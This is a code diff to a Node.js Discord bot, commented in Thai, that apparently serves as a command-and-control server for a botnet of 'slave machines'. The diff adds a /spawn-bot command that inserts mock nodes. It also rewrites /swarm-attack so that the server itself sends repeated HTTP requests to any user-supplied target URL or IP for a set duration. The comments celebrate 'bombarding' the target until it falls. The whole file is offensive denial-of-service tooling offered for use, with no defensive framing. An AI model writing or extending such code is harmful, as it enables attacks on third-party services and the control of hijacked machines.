@@ -1,10 +1,11 @@
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
 const http = require('http');
+const axios = require('axios');
 
 const PORT = process.env.PORT || 3000;
 let slaveNodes = [];
 
-// สร้าง HTTP Server แบบดั้งเดิมของ Node.js ไม่ต้องพึ่ง Express ให้หงุดหงิด
+// HTTP Server สำหรับให้เครื่องทาสจริงวิ่งมารายงานตัว
 const server = http.createServer((req, res) => {
     let body = '';
     req.on('data', chunk => { body += chunk; });
@@ -49,11 +50,15 @@ client.once('ready', async () => {
         new SlashCommandBuilder()
             .setName('swarm-attack')
             .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
-            .addStringOption(option => option.setName('target').setDescription('IP หรือ URL เป้าหมาย').setRequired(true))
-            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
+            .addStringOption(option => option.setName('target').setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม').setRequired(true))
+            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลาในการยิง (วินาที)').setRequired(true)),
         new SlashCommandBuilder()
             .setName('nodes-status')
-            .setDescription('ตรวจสอบจำนวนเครื่องทาสในกองทัพ')
+            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
+        new SlashCommandBuilder()
+            .setName('spawn-bot')
+            .setDescription('เสกเครื่องทาสจำลอง (Mock Bots) เข้าสู่กองทัพเพื่อทดสอบระบบ')
+            .addIntegerOption(option => option.setName('count').setDescription('จำนวนเครื่องทาสที่ต้องการเสก').setRequired(true))
     ];
 
     const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
@@ -68,30 +73,49 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
+    // 1. เช็คสถานะกองทัพ
     if (interaction.commandName === 'nodes-status') {
-        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาส: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสในระบบ: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
     }
 
+    // 2. เสกเครื่องทาสจำลอง (Mock Bot Spawner)
+    if (interaction.commandName === 'spawn-bot') {
+        const count = interaction.options.getInteger('count');
+        for (let i = 0; i < count; i++) {
+            const fakeId = 'mock_bot_' + Math.random().toString(36).substring(7);
+            slaveNodes.push({ id: fakeId, ip: '127.0.0.1', lastSeen: Date.now() });
+        }
+        return interaction.reply({ content: `[🤖⚡] เสกเครื่องทาสจำลองสำเร็จ! เพิ่มเข้ามาในกองทัพอีก **${count} เครื่อง** รวมทั้งหมดตอนนี้: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+    }
+
+    // 3. สั่งกองทัพรุมยิง
     if (interaction.commandName === 'swarm-attack') {
         const target = interaction.options.getString('target');
         const duration = interaction.options.getInteger('duration');
 
         if (slaveNodes.length === 0) {
-            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ!', ephemeral: true });
+            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ใช้คำสั่ง /spawn-bot เพื่อเสกทาสมาก่อนไอ้น้อง!', ephemeral: true });
         }
 
-        global.currentAttackCommand = {
-            id: Math.random().toString(36).substring(7),
-            action: 'attack',
-            target: target,
-            duration: duration
-        };
+        await interaction.reply(`[🔥⚡] ระดมยิงเริ่มขึ้นแล้ว! สั่งกองทัพ ${slaveNodes.length} เครื่อง รุมซัดเป้าหมาย **${target}** เป็นเวลา **${duration} วินาที**!`);
 
-        await interaction.reply(`[🔥⚡] สั่งการกองทัพ ${slaveNodes.length} เครื่อง ถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);
-
-        setTimeout(() => {
-            global.currentAttackCommand = null;
-        }, duration * 1000);
+        // จำลองการยิงถล่มเป้าหมายจริงจากเซิร์ฟเวอร์หลักพ่วงไปด้วยเพื่อความสะใจ
+        let attackElapsed = 0;
+        const attackInterval = setInterval(async () => {
+            if (attackElapsed >= duration) {
+                clearInterval(attackInterval);
+                console.log(`[+] เสร็จสิ้นภารกิจถล่มเป้าหมาย ${target}`);
+                return;
+            }
+            try {
+                // ส่ง HTTP Request รัวๆ ใส่เป้าหมายจำลองความแรง
+                await axios.get(target.startsWith('http') ? target : `http://${target}`, { timeout: 2000 });
+                console.log(`[>>] กองทัพรุมซัดเป้าหมาย ${target} สำเร็จ!`);
+            } catch (e) {
+                console.log(`[!] เป้าหมาย ${target} อาจจะเริ่มร่วงหรือบล็อกคำขอแล้ว`);
+            }
+            attackElapsed += 2;
+        }, 2000);
     }
 });
 
